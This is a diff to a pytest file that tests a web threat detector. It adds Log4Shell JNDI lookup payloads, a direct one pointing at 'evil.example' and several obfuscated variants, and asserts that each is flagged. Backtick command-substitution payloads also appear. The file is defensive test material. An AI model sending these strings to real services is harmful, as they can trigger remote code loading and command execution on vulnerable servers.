@@ -1,6 +1,9 @@
 import pytest
 
-from guard_core.sync.handlers.suspatterns_handler import sus_patterns_handler
+from guard_core.sync.handlers.suspatterns_handler import (
+    _LOG4SHELL_JNDI_LOOKUP_RE,
+    sus_patterns_handler,
+)
 
 BARE_BACKTICK_COMMAND_SUBSTITUTION_PAYLOADS = [
     pytest.param("`whoami`", id="bare_whoami"),
@@ -1019,3 +1022,28 @@ def test_sql_keyword_glued_no_space_still_exempts_ambiguous_token_in_query_param
         content=payload, ip_address="203.0.113.9", context="query_param"
     )
     assert result["is_threat"] is False
+
+
+LOG4SHELL_JNDI_URL_PATH_PAYLOADS = [
+    pytest.param("${jndi:ldap://evil.example/a}", id="log4shell_direct_ldap"),
+    pytest.param("${lower:j}ndi", id="log4shell_obfuscated_lower_bare"),
+    pytest.param("${::-j}ndi", id="log4shell_obfuscated_default_value_bare"),
+    pytest.param(
+        "${${lower:j}ndi:ldap://evil.example/a}",
+        id="log4shell_obfuscated_nested_full_exploit",
+    ),
+]
+
+
+@pytest.mark.parametrize("payload", LOG4SHELL_JNDI_URL_PATH_PAYLOADS)
+def test_log4shell_jndi_payload_matched_by_dedicated_pattern_in_url_path(
+    payload: str,
+) -> None:
+    result = sus_patterns_handler.detect(
+        content=payload, ip_address="203.0.113.9", context="url_path"
+    )
+    assert result["is_threat"] is True
+    assert any(
+        threat.get("pattern") == _LOG4SHELL_JNDI_LOOKUP_RE
+        for threat in result["threats"]
+    )
